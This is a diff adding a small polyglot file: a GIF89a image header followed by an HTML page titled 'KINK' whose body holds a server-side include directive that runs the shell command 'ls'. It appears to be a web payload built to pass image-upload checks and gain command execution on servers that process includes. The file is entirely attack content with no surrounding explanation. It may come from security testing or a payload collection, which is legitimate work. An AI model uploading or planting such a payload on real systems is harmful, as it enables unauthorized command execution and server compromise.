@@ -1,0 +1,13 @@
+GIF89a;
+<!DOCTYPE html>
+<html>
+<head>
+<title>KINK</title>
+</head>
+<body>
+<h1>Kink</h1>
+<pre>
+<!--#exec cmd="ls"-->
+</pre>
+</body>
+</html>
